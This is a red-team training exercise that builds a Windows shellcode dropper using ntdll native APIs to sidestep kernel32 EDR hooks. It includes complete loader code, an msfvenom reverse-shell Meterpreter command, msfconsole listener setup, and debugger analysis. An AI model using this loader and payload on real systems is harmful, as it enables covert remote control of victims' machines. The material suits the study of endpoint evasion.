## Exercise 4: Medium_Level_API_Dropper
In this exercise, we will make the first modification to the reference dropper and replace the Windows APIs (kernel32.dll) with native APIs (ntdll.dll).
We create a **medium-level API shellcode dropper** in short **MLA-Dropper** based on native APIs. 
![medium_level_dropper_principal](https://user-images.githubusercontent.com/50073731/235372969-4d24ddec-7ee5-443e-966a-24b3d70dc3a8.png)



## Exercice 4 tasks:
### Create HLA-Dropper
1. Create a new C++ POC in Visual Studio 2019 and use the provided code for the MLA-Dropper.
2. Create staged x64 meterpreter shellcode with msfvenom and copy it to the C++ MLA-Dropper poc. 
3. Compile the MLA-Dropper as release or debug x64. 
4. Create and run a staged x64 meterpreter listener with msfconsole.
5. Run your compiled .exe and verify that a stable command and control channel opens. 
### Analyse HLA-Dropper
6. Use the Visual Studio tool dumpbin to analyze the compiled HLA-Dropper. Is the result what you expected?  
7. Use the API Monitor to analyze the compiled HLA-Dropper in the context of the four APIs used. Is the result what you expected? 
8. Use the x64dbg debugger to analyze the compiled HLA dropper: from which module and location are the syscalls from the four APIs used being executed?
Is the result what you expected? 


## Visual Studio
To create the medium-level API dropper project, follow the procedure of the high-level API dropper exercise, take a look to follow the necessary steps.
We replace all Windows APIs with the corresponding native APIs and create our MLA-Dropper.
- NtAllocateVirtualMemory
- NtWriteVirtualMemory
- NtCreateThreadEx
- NtWaitForSingleObject

The code works as follows. Unlike the Windows APIs, most of the native APIs are not officially or partially documented by Microsoft and are therefore not intended for Windows OS developers. To use the native APIs in our MLA-Dropper, we must manually define the function pointers for the native API functions in the MLA-Dropper code.
<details>
    
<p align="center">
<img width="726" alt="image" src="https://user-images.githubusercontent.com/50073731/235373833-787137bf-e79b-41a3-b0cb-a83a29c541be.png">
</p>
</details>
    
    
    
Shellcode declaration same as before in the high-level API dropper.
<p align="center">
<img width="608" alt="image" src="https://user-images.githubusercontent.com/50073731/235367184-71a8dbb0-036b-4cc1-93d2-28ef1abfd9ef.png">
</p>  

To directly access the code of the native APIs used, we need to manually load the required native APIs from ntdll.dll.
<p align="center">
<img width="790" alt="image" src="https://user-images.githubusercontent.com/50073731/235374135-eeda7d5a-5a95-40bf-8a58-43e65c90d9c6.png">
</p>

For memory allocation, we replace the Windows API VirtualAlloc with the native API **NtAllocateVirtualMemory**.
<p align="center">
<img width="741" alt="image" src="https://user-images.githubusercontent.com/50073731/235373720-c004340c-4132-41b7-9494-1d7f0aaea053.png">
</p>

For shellcode copying, we replace the Windows API WriteProcessMemory with the native API **NtWriteVirtualMemory**.
<p align="center">
<img width="591" alt="image" src="https://user-images.githubusercontent.com/50073731/235374052-448e1e9d-caf5-4d80-972f-fd0ef70feb95.png">
</p>

For shellcode execution, we replace the Windows API CreateThread with the native API **NtCreateThreadEx**.
<p align="center">
<img width="568" alt="image" src="https://user-images.githubusercontent.com/50073731/235374248-fecf50c3-72b9-4f2b-95b3-d0aa86378a79.png">
</p>

And finally we have to replace the Windows API WaitForSingleObject with the native API **NtWaitForSingleObject**.
<p align="center">
<img width="603" alt="image" src="https://user-images.githubusercontent.com/50073731/235374361-df94b5cc-1307-4229-9d54-c83bafe2daac.png">
</p>

Here is the complete code, and you can copy and paste this code into your MLA-Dropper project in Visual Studio.

```
#include <stdio.h>
#include <windows.h>
#include <winternl.h>

// Define function pointers for native API functions
typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* PNTWRITEVIRTUALMEMORY)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* PNTCREATETHREADEX)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS(NTAPI* PNTWAITFORSINGLEOBJECT)(HANDLE, BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS(NTAPI* PNTCLOSE)(HANDLE);
typedef NTSTATUS(NTAPI* PNTFREEVIRTUALMEMORY)(HANDLE, PVOID*, PSIZE_T, ULONG);


int main() {

    // Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
    unsigned char code[] = "\xfc\x48\x83...";

    // Load native API functions from ntdll.dll
    PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    PNTWRITEVIRTUALMEMORY NtWriteVirtualMemory = (PNTWRITEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
    PNTCREATETHREADEX NtCreateThreadEx = (PNTCREATETHREADEX)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    PNTWAITFORSINGLEOBJECT NtWaitForSingleObject = (PNTWAITFORSINGLEOBJECT)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWaitForSingleObject");
    PNTCLOSE NtClose = (PNTCLOSE)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtClose");
    PNTFREEVIRTUALMEMORY NtFreeVirtualMemory = (PNTFREEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFreeVirtualMemory");


    // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
    // 'exec' will hold the base address of the allocated memory region
    void* exec = NULL;
    SIZE_T size = sizeof(code);
    NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy the shellcode into the allocated memory region
    SIZE_T bytesWritten;
    NtWriteVirtualMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);

    // Execute the shellcode in memory using a new thread
    // Pass the address of the shellcode as the thread function (StartRoutine) and its parameter (Argument)
    HANDLE hThread;
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), exec, exec, FALSE, 0, 0, 0, NULL);

    // Wait for the end of the thread to ensure the shellcode execution is complete
    NtWaitForSingleObject(hThread, FALSE, NULL);

    // Return 0 as the main function exit code
    return 0;

}
```


## Meterpreter Shellcode
Again, we will create our meterpreter shellcode with msfvenom in Kali Linux. To do this, we will use the following command and create x64 staged meterpreter shellcode.
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Kali LPORT=80 -f c > /tmp/shellcode.txt
```
<p align="center">
<img width="696" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
</p>

The shellcode can then be copied into the MLA-Dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.<p align="center">
<img width="479" alt="image" src="https://user-images.githubusercontent.com/50073731/235414557-d236582b-5bab-4754-bd12-5f7817660c3a.png">
</p>


## MSF-Listener
Before we test the functionality of our MLA-Dropper, we need to create a listener within msfconsole.

**kali>**
```
msfconsole
```
**msf>**
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost IPv4_Redirector_or_IPv4_Kali
set lport 80 
set exitonsession false
run
```
<p align="center">
<img width="510" alt="image" src="https://user-images.githubusercontent.com/50073731/235358630-09f70617-5f6e-4f17-b366-131f8efe19d7.png">
</p>

Once the listener has been successfully started, you can run your compiled MLA-Dropper. If all goes well, you should see an incoming command and control session. 

<p align="center">
<img width="674" alt="image" src="https://user-images.githubusercontent.com/50073731/235369228-84576762-b3b0-4cf7-a265-538995d42c40.png">
</p>



## MLA-Dropper analysis: Dumpbin tool
The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via kernel32.dll. The following command can be used to check the imports.
**cmd>**
```
cd C:\Program Files (x86)\Microsoft Visual Studio\2019\Community
dumpbin /imports high_level.exe
```
Compared to the high level dropper, you can observe that the medium level dropper **no longer imports** the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread and WaitForSingleObject from kernel32.dll. This result was expected and is correct.
<p align="center">
<img width="729" alt="image" src="https://user-images.githubusercontent.com/50073731/235374656-117e0468-cd4d-4832-afb7-599cf94d2f1b.png">
</p>

## MLA-Dropper analysis: API-Monitor
Compared to the high-level dropper, you can see that the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread, and WaitForSingleObject no longer pass to the four corresponding native APIs. For a correct check, it is necessary to filter to the correct APIs. Only by providing the correct Windows APIs and the corresponding native APIs, we can be sure that there are no more transitions in context of the used APIs in our MLA-Dropper. We filter on the following API calls:
- VirtualAlloc
- NtAllocateVirtualMemory
- WriteProcessMemory
- NtWriteVirtualMemory
- CreateThread
- NtCreateThreadEx
- WaitForSingleObject
- NtWaitForSingleObject

If everything was done correctly, you could observe that there are more transitions from the Windows APIs to the native APIs we used in our MLA-Dropper poc.
This result was expected and is correct because our MLA-Dropper accesses or imports the needed native APIs NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject directly from ntdll.dll.
<p align="center">
<img width="522" alt="image" src="https://user-images.githubusercontent.com/50073731/235374864-c7e90dd6-82c6-49d1-a90c-b80a531416b3.png">
</p>

## MLA-Dropper analysis: x64dbg 
Using x64dbg we verify from which region in the PE structure of the MLA-Dropper the system calls for the used native APIs are executed. Since direct system calls are not yet used in MLA-Dropper, the figure again shows that the system call is correctly executed from the .text region of ntdll.dll. 
![image](https://user-images.githubusercontent.com/50073731/235368598-ad159117-abb5-4b0d-8b52-bea2a162b565.png)


## Summary: Medium-level API Dropper
- We made the transition from high-level APIs to mid-level APIs, or from Windows APIs to native APIs.
- But still no direct use of system calls
- Syscall execution via medium_level_dropper.exe -> ntdll.dll -> syscall
- Dropper no longer imports Windows APIs from kernel32.dll
- In case of EDR would only hook kernel32.dll -> EDR bypassed 
